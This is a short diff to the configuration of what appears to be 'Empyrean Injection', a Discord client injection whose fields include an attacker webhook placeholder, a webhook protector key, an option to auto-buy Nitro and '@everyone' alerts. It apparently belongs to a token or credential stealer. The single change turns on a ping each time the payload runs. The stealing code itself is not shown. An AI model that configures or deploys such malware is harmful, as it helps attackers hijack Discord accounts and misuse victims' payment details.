@@ -9,7 +9,7 @@ const config = {
   webhook: '%WEBHOOK%',
   webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false, 
-  ping_on_run: false, 
+  ping_on_run: true, 
   ping_val: '@everyone', 
   embed_name: 'Empyrean Injection', 
   embed_icon: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/main/imgs/pfp.png', 
